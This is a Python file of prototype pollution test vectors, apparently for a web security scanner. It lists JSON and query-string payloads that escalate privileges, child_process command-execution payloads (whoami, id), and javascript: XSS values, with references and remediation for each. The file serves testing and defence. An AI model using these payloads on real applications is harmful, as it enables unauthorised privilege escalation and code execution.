"""
Prototype Pollution Test Vectors
Targets JavaScript prototype pollution vulnerabilities in Node.js and client-side code
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, ConfidenceLevel, SensitivityLevel
)

PROTOTYPE_POLLUTION_VECTORS = [
    TestVector(
        id="proto-pollution-001",
        name="Prototype Pollution via __proto__",
        description="Pollute object prototype using __proto__ property",
        vuln_type=VulnerabilityType.PROTOTYPE_POLLUTION,
        position=Position(type=PositionType.BODY_JSON, name="user", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"__proto__":{"isAdmin":true}}',
            variants=[
                '{"__proto__":{"role":"admin"}}',
                '{"__proto__":{"authenticated":true}}',
                '{"__proto__":{"permissions":["read","write","delete"]}}',
                '{"__proto__":{"toString":"polluted"}}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Prototype polluted", "isAdmin property on all objects", "Privilege escalation"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["prototype-pollution", "javascript", "privilege-escalation", "nodejs"],
        references=[
            "https://portswigger.net/web-security/prototype-pollution",
            "https://github.com/HoLyVieR/prototype-pollution-nsec18",
            "https://blog.securelayer7.net/prototype-pollution-attack-exploitation/"
        ],
        remediation="Use Object.create(null), validate JSON input, freeze prototypes, use Map instead of objects"
    ),
    
    TestVector(
        id="proto-constructor-001",
        name="Prototype Pollution via constructor.prototype",
        description="Pollute prototype through constructor property",
        vuln_type=VulnerabilityType.PROTOTYPE_POLLUTION,
        position=Position(type=PositionType.BODY_JSON, name="config", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"constructor":{"prototype":{"isAdmin":true}}}',
            variants=[
                '{"constructor":{"prototype":{"role":"superadmin"}}}',
                '{"constructor":{"prototype":{"bypassAuth":true}}}',
                '{"constructor":{"prototype":{"exec":"require(\\"child_process\\").exec(\\"whoami\\")"}}}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Constructor pollution", "Prototype modified", "Global object pollution"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["prototype-pollution", "constructor", "rce", "nodejs"],
        references=[
            "https://portswigger.net/research/widespread-prototype-pollution-gadgets",
            "https://github.com/BlackFan/client-side-prototype-pollution",
            "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
        ],
        remediation="Validate constructor property access, use schema validation, implement Object.freeze"
    ),
    
    TestVector(
        id="proto-merge-001",
        name="Prototype Pollution via Recursive Merge",
        description="Exploit recursive object merge functions to pollute prototype",
        vuln_type=VulnerabilityType.PROTOTYPE_POLLUTION,
        position=Position(type=PositionType.BODY_JSON, name="options", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"__proto__":{"polluted":"yes"}}',
            variants=[
                '{"constructor":{"prototype":{"polluted":true}}}',
                '{"__proto__":{"toString":{"valueOf":true}}}',
                '{"__proto__":{"isPrototypeOf":"polluted"}}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Merge function vulnerable", "Prototype chain modified", "Object pollution"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["prototype-pollution", "merge", "lodash", "jquery", "recursive"],
        references=[
            "https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/",
            "https://github.com/lodash/lodash/pull/4874",
            "https://hackerone.com/reports/380873"
        ],
        remediation="Use safe merge libraries, validate merge keys, avoid recursive merge on user input"
    ),
    
    TestVector(
        id="proto-json-001",
        name="Prototype Pollution via JSON.parse",
        description="Pollute prototype by parsing malicious JSON with __proto__",
        vuln_type=VulnerabilityType.PROTOTYPE_POLLUTION,
        position=Position(type=PositionType.BODY_JSON, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"__proto__":{"shell":"require(\\"child_process\\").execSync(\\"id\\").toString()"}}',
            variants=[
                '{"__proto__":{"env":{"NODE_ENV":"production"}}}',
                '{"__proto__":{"sourceURL":"javascript:alert(1)"}}',
                '{"constructor":{"prototype":{"nodeType":1}}}',
                '{"__proto__":{"transport_url":"javascript:alert(document.domain)"}}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["JSON parsed with __proto__", "Prototype pollution after parse", "RCE execution"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["prototype-pollution", "json", "rce", "nodejs", "xss"],
        references=[
            "https://medium.com/intrinsic-blog/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96",
            "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution",
            "https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf"
        ],
        remediation="Use reviver function to block __proto__, validate JSON schema, implement allowlist"
    ),
    
    TestVector(
        id="proto-query-001",
        name="Prototype Pollution via Query String Parser",
        description="Pollute prototype using query string parsers (qs, query-string libraries)",
        vuln_type=VulnerabilityType.PROTOTYPE_POLLUTION,
        position=Position(type=PositionType.QUERY, name="__proto__[isAdmin]", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="true",
            variants=[
                "constructor[prototype][isAdmin]=true",
                "constructor.prototype.isAdmin=true",
                "__proto__.role=admin",
                "constructor[prototype][authenticated]=1"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["Query string parsed", "Prototype polluted via URL", "isAdmin on all objects"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["prototype-pollution", "query-string", "qs", "nodejs", "url-parsing"],
        references=[
            "https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications",
            "https://snyk.io/vuln/npm:qs:20170213",
            "https://github.com/ljharb/qs/issues/200"
        ],
        remediation="Use safe query parsers, disable __proto__ parsing, validate query parameters"
    )
]
